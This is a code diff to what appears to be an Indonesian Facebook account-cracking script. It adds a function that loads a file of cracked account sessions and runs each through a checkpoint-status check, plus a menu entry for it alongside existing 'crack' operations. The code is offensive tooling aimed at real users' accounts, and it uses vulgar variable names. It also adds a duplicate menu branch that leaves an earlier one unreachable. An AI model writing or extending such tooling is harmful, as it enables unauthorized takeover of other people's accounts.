@@ -187,6 +187,28 @@ def postingan(romz,headers=header):
         menu()
     except Exception as e:
         exit('\n %s[!] gagal dump id'%(P))
+### Result Hasil
+def cek_opsi():
+	print((p+"\n ["+k+"•"+m+"•"+p+"] Masukan File sesi.txt"))
+	files = input(p+" ["+k+"•"+m+"•"+p+"] File: ")
+	if files == "":
+		cek_opsi()
+	try:
+		buka_baju = open(files, "r").readlines()
+	except IOError:
+		exit(p+" ["+k+"•"+m+"•"+p+"] Files %s%s%s Tidak Ada!"%(h,files,p))
+	print(p+" ["+k+"•"+m+"•"+p+"] Total Account Sesi : "+str(len(buka_baju)))
+	print(p+" ["+k+"•"+m+"•"+p+"] Check Opsi Checkpoint, Please Wait...")
+	for memek in buka_baju:
+		kontol = memek.replace("\n","")
+		titid  = kontol.split(" • ")
+		print("\033[1;37m\n [\033[1;33m•\033[1;91m•\033[1;37m] "+kontol.replace(" + ",""))
+		try:
+			check_in(titid[0].replace(" + ",""), titid[1])
+		except requests.exceptions.ConnectionError:
+			pass
+	input("%s [Back]"%(p))
+	menu()
 # START CRACK
 class ngentod:
 
@@ -625,9 +647,10 @@ def menu():
     print (' (%s04%s) Facebook Crack Postingan '%(O,P))
     print (' (%s05%s) %sMemulai Operasi Crack %s'%(O,P,M,P)) 
     print (' (%s06%s) User agent'%(O,K)) 
-    print (' (%s07%s) Cek Pendapatan Akun'%(H,O)) 
-    #print (' (%s08%s) Gabung group'%(O,P))
-    #print (' (%s09%s) Info script'%(O,P))
+    print (' (%s07%s) Cek Pendapatan Akun'%(O,B))
+    print (' (%s08%s) Cek Jenis Checkpoint'%(H,B)) 
+    #print (' (%s09%s) Gabung group'%(O,P))
+    #print (' (%s10%s) Info script'%(O,P))
     print (' (%s00%s) Log Out '%(P,H))
     unik = raw_input('\n%s [!] Menu : %s'%(P,O))
     if unik == '':
@@ -649,6 +672,8 @@ def menu():
         print "%s [02] Pendapatan Instagram "%(P)
         c = raw_input('\n%s [?] Menu : %s'%(P,O))
     	hasill(c)
+    elif unik in['8','08']:
+        cek_opsi()
     elif unik in['8','08']:
         os.system("xdg-open https://www.facebook.com/groups/924679595149360")
     elif unik in['9','09']:
